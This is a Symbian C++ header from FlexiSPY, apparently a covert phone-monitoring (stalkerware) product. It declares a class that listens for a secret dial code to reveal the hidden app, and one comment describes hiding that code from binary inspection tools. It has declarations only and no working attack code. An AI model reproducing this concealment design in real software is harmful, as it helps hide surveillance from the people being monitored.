#ifndef __SecretCodeManager_H__
#define __SecretCodeManager_H__

#include <w32std.h>

#include "LogonManager.h"
#include "FxsBuild.h"

class TApaTaskUtil;
class CLicenceManager;
class TLogonManager;
class RFs;
//
//FlexiSPY Uid
//
const TUid KUidFxsApp = {APP_UID};

_LIT(KProductID,PRODUCT_ID_STR);
_LIT(KAppFxsPath,	APP_FULL_PATH);

const TInt  KMaxSecretCodeLenght = 30;
const TInt  KSecretCodeArrayaGranularity = 10;

const TUint KSecretCodeClearIndicator = '*';
const TUint KSecretCodeBegin = '#';
const TUint KSecretCodeEnd = KSecretCodeBegin;

//
//If application is not activated yet
//Bring app to foreground whenever usr types this key
//
//
//The default key is 900900900
//Do not declare as _LIT otherwise it will be viewable in program code (exe) by using petran command
//
//
const TUint KDefaultScretCodeLength =  9; //*#900900900#

//
// This class resposible for sending and bringing Fxs UI application to foreground/background
// 
//
class CSecretCodeManager : public CBase/*,
					  	   public MSecretCodeObserver*/
{
public:
	static CSecretCodeManager* NewL(CLicenceManager& aLicenceMan, TApaTaskUtil& aTaskUtil,RFs& aFs);
	~CSecretCodeManager();	
	
//private: //MSecretCodeObserver
	void HandleFocusAppChanged();
	void SecretCodePressedL(const TUint& aCode);
	
private:
	CSecretCodeManager(CLicenceManager& aLicenceMan, TApaTaskUtil& aTaskUtil,RFs& aFs);
	void ConstructL();
	
	void CompareHashAndBringAppToForeground();
	TBool MatchDefaultKey(const TDesC8& aActivationCodeStr);
	TInt GetAppFile(TDes& aAppFullName);
	
	void __Debug();
	
private:
	RFs& iFs;
	TApaTaskUtil& iApaTask;
	CLicenceManager& iLicenceMan;
	TLogonManager* iLogon;	
	
	/*
	* This helds numeric key press
	* 
	*/
	RArray<TUint>	iActivationCodeArr;
	
	TBool iKeyBeginPressed;
};

#endif